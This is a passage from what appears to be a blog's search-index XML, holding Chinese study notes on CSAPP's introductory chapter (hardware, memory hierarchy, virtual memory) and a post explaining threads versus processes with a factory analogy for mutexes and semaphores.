href="#三、系统的硬件组成" class="headerlink" title="三、系统的硬件组成"></a>三、系统的硬件组成</h3><p><img src="1-4.jpg" alt=""><br><strong>CPU</strong>:中央处理单元 &ensp; <strong>ALU</strong>:算术/逻辑单元 &ensp;<strong>PC</strong>:程序计数器 &ensp;<strong>USB</strong>:通用串行总线</p><ul><li>总线贯穿整个系统的是一组电子管道,称做总线,它携带信息字节并负责在各个部件间传递.</li><li>I/O设备:输入/输出(I/O)设备是系统与外部世界的联系通道</li><li>主存:主存是一个临时存储设备,在处理器执行程序时,用来存放程序和程序处理的数据.</li><li>处理器:中央处理单元(CPU),简称处理器,是解释(或执行)存储在主存中指令的引擎.<br>处理器的核心是一个字长的存储设备(或寄存器),称为程序计数器(PC).</li></ul><h3 id="四、存储设备形成层次结构"><a href="#四、存储设备形成层次结构" class="headerlink" title="四、存储设备形成层次结构"></a>四、存储设备形成层次结构</h3><p>存储器层次结构的主要思想是一层上的存储器作为低一层存储器的高速缓存.<br><img src="1-9.png" alt=""></p><h3 id="五、线程进程，单独分离写了个博客，这里不重复"><a href="#五、线程进程，单独分离写了个博客，这里不重复" class="headerlink" title="五、线程进程，单独分离写了个博客，这里不重复"></a>五、线程进程，单独分离写了个博客，这里不重复</h3><h3 id="六、计算机系统中抽象的重要性"><a href="#六、计算机系统中抽象的重要性" class="headerlink" title="六、计算机系统中抽象的重要性"></a>六、计算机系统中抽象的重要性</h3><ul><li>文件是对I/O的抽象</li><li>虚拟存储器是对程序存储器的抽象.</li><li>进程是对一个正在运行的程序的抽象.</li><li>虚拟机,它提供对整个计算机(操作系统,处理器和程序)的抽象.</li></ul><p><img src="chouxiang.jpg" alt=""></p><h3 id="七、虚拟内存"><a href="#七、虚拟内存" class="headerlink" title="七、虚拟内存"></a>七、虚拟内存</h3><h4 id="虚拟内存是一个抽象概念，它为每个进程提供了一个假象，即每个进程都在独占地使用主存。"><a href="#虚拟内存是一个抽象概念，它为每个进程提供了一个假象，即每个进程都在独占地使用主存。" class="headerlink" title="虚拟内存是一个抽象概念，它为每个进程提供了一个假象，即每个进程都在独占地使用主存。"></a>虚拟内存是一个抽象概念，它为每个进程提供了一个假象，即每个进程都在独占地使用主存。</h4><h4 id="每个进程看到的内存都是一致的，称为虚拟地址空间。在linux中，进程的虚拟地址空间如下图"><a href="#每个进程看到的内存都是一致的，称为虚拟地址空间。在linux中，进程的虚拟地址空间如下图" class="headerlink" title="每个进程看到的内存都是一致的，称为虚拟地址空间。在linux中，进程的虚拟地址空间如下图"></a>每个进程看到的内存都是一致的，称为虚拟地址空间。在linux中，进程的虚拟地址空间如下图</h4><p><img src="1-13.png" alt=""></p><ul><li><p>程序代码和数据：对于所有进程来说，代码从一固定地址开始，紧接和C全局变量相对应的数据位置。第七章研究链接和加载时，学到更多有关地址空间的内容。</p></li><li><p>堆 ：代码和数据区紧随着运行时堆。代码和数据区是在进程一开始就被规定了大小，与此不同，调用malloc和free时堆动态的扩展和收缩。第9章学习管理虚拟存储器时，详细研究。</p></li><li><p>共享库：地址空间的中间部分存放C标准库和数学库这样共享库代码和数据的区域。共享库概念非常强大，相当难懂。第七章详解。</p></li><li><p>栈: 用户虚拟地址顶部的是用户栈，编译器用它来实现函数调用。和堆一样，在执行时动态的扩展和收缩。第三章详解。</p></li><li><p>内核虚拟内存。 内核总是驻留在内存中，是操作系统一部分。</p></li></ul><h3 id="总结：由于本章只是计算机漫游，故只阐释了计算机的大概，具体细节后面章节，慢慢展开"><a href="#总结：由于本章只是计算机漫游，故只阐释了计算机的大概，具体细节后面章节，慢慢展开" class="headerlink" title="总结：由于本章只是计算机漫游，故只阐释了计算机的大概，具体细节后面章节，慢慢展开"></a>总结：由于本章只是计算机漫游，故只阐释了计算机的大概，具体细节后面章节，慢慢展开</h3>]]></content>
      
      
      <categories>
          
          <category> CSAPP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>多线程和多进程的暧昧缠绵</title>
      <link href="/2018/12/03/duo-xian-cheng-he-duo-jin-cheng-de-ai-mei-chan-mian/"/>
      <url>/2018/12/03/duo-xian-cheng-he-duo-jin-cheng-de-ai-mei-chan-mian/</url>
      
        <content type="html"><![CDATA[<h4 id="先教科书一波（“千万别被吓到”），教科书上关于多进程和多线程解释为"><a href="#先教科书一波（“千万别被吓到”），教科书上关于多进程和多线程解释为" class="headerlink" title="先教科书一波（“千万别被吓到”），教科书上关于多进程和多线程解释为"></a>先教科书一波（“千万别被吓到”），教科书上关于多进程和多线程解释为</h4><pre><code>进程是资源分配的最小单位，线程是CPU调度的最小单位</code></pre><p>据说这句话拿去考试,改卷老师一定会给高分，但是还是嘚深入了解一下</p><a id="more"></a><h4 id="线程的定义："><a href="#线程的定义：" class="headerlink" title="线程的定义："></a>线程的定义：</h4><pre><code>线程是操作系统能够进行运算调度的最小单位。它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。一个线程是一个execution context（执行上下文）即一个cpu执行时所需要的一串指令。</code></pre><h4 id="线程的工作方式类比："><a href="#线程的工作方式类比：" class="headerlink" title="线程的工作方式类比："></a>线程的工作方式类比：</h4><pre><code>假设你正在读一本书，没有读完，你想休息一下，但是你想在回来时恢复到当时读的具体进度。有一个方法就是记下页数、行数与字数这三个数值，这些数值就是execution context。如果你的室友在你休息的时候，使用相同的方法读这本书。你和她只需要这三个数字记下来就可以在交替的时间共同阅读这本书了。线程的工作方式与此类似。CPU会给你一个在同一时间能够做多个运算的幻觉，实际上它在每个运算上只花了极少的时间，本质上CPU同一时刻只干了一件事。它能这样做就是因为它有每个运算的execution context。就像你能够和你朋友共享同一本书一样，多任务也能共享同一块CPU。</code></pre><h4 id="进程的定义："><a href="#进程的定义：" class="headerlink" title="进程的定义："></a>进程的定义：</h4><pre><code>一个程序的执行实例就是一个进程。每一个进程提供执行程序所需的所有资源。（进程本质上是资源的集合）一个进程有一个虚拟的地址空间、可执行的代码、操作系统的接口、安全的上下文（记录启动该进程的用户和权限等等）唯一的进程ID、环境变量、优先级类、最小和最大的工作空间（内存空间），还要有至少一个线程。每一个进程启动时都会最先产生一个线程，即主线程。然后主线程会再创建其他的子线程。</code></pre><h4 id="文邹邹的讲一下区别（如果你困了，请直接跳至图解进程线程）"><a href="#文邹邹的讲一下区别（如果你困了，请直接跳至图解进程线程）" class="headerlink" title="文邹邹的讲一下区别（如果你困了，请直接跳至图解进程线程）"></a>文邹邹的讲一下区别（如果你困了，请直接跳至图解进程线程）</h4><ul><li>同一个进程中的线程共享同一内存空间，但是进程之间是独立的。</li><li>同一个进程中的所有线程的数据是共享的（进程通讯），进程之间的数据是独立的。</li><li>对主线程的修改可能会影响其他线程的行为，但是父进程的修改（除了删除以外）不会影响其他子进程。</li><li>线程是一个上下文的执行指令，而进程则是与运算相关的一簇资源。</li><li>同一个进程的线程之间可以直接通信，但是进程之间的交流需要借助中间代理来实现。</li><li>创建新的线程很容易，但是创建新的进程需要对父进程做一次复制。</li><li>一个线程可以操作同一进程的其他线程，但是进程只能操作其子进程。</li><li>线程启动速度快，进程启动速度慢（但是两者运行速度没有可比性）。<h4 id="再配上一张图来对比一下"><a href="#再配上一张图来对比一下" class="headerlink" title="再配上一张图来对比一下"></a>再配上一张图来对比一下</h4><img src="duibi.jpg" alt=""><h4 id="有趣的图解一波程序执行的线程与进程的概念"><a href="#有趣的图解一波程序执行的线程与进程的概念" class="headerlink" title="有趣的图解一波程序执行的线程与进程的概念"></a>有趣的图解一波程序执行的线程与进程的概念</h4></li></ul><ol><li>计算机的核心是CPU，它承担了所有的计算任务。它就像一座工厂，时刻在运行。<br><img src="1.jpg" alt=""></li><li>假定工厂的电力有限，一次只能供给一个车间使用。也就是说，一个车间开工的时候，<br>其他车间都必须停工。背后的含义就是，单个CPU一次只能运行一个任务。<br><img src="2.jpg" alt=""></li><li>进程就好比工厂的车间，它代表CPU所能处理的单个任务。任一时刻，CPU总是运行一个进程<br>其他进程处于非运行状态.<br><img src="3.jpg" alt=""></li><li>一个车间里，可以有很多工人。他们协同完成一个任务。<br><img src="4.jpg" alt=""></li><li>线程就好比车间里的工人。一个进程可以包括多个线程。<br><img src="5.jpg" alt=""></li><li>车间的空间是工人们共享的，比如许多房间是每个工人都可以进出的。<br>这象征一个进程的内存空间是共享的，每个线程都可以使用这些共享内存。<br><img src="6.jpg" alt=""></li><li>可是，每间房间的大小不同，有些房间最多只能容纳一个人，比如厕所。里面有人的时候<br>其他人就不能进去了。这代表一个线程使用某些共享内存时，其他线程必须等它结束，才能使用这一块内存<br><img src="7.jpg" alt=""></li><li>一个防止他人进入的简单方法，就是门口加一把锁。先到的人锁上门，后到的人看到上锁，就在门口排队<br>等锁打开再进去。这就叫”互斥锁”（Mutual exclusion，缩写 Mutex），防止多个线程同时读写某一块内存区域。<br><img src="8.jpg" alt=""></li><li>还有些房间，可以同时容纳n个人，比如厨房。也就是说，如果人数大于n，多出来的人只能在外面等着。<br>这好比某些内存区域，只能供给固定数目的线程使用。<br><img src="9.jpg" alt=""></li><li>这时的解决方法，就是在门口挂n把钥匙。进去的人就取一把钥匙，出来时再把钥匙挂回原处。<br>后到的人发现钥匙架空了，就知道必须在门口排队等着了。这种做法叫做”信号量”（Semaphore）<br>用来保证多个线程不会互相冲突。<br>不难看出，mutex是semaphore的一种特殊情况（n=1时）。也就是说，完全可以用后者替代前者。<br>但是，因为mutex较为简单，且效率高，所以在必须保证资源独占的情况下，还是采用这种设计。<br><img src="10.jpg" alt=""></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机杂七杂八 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进程&amp;&amp;线程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
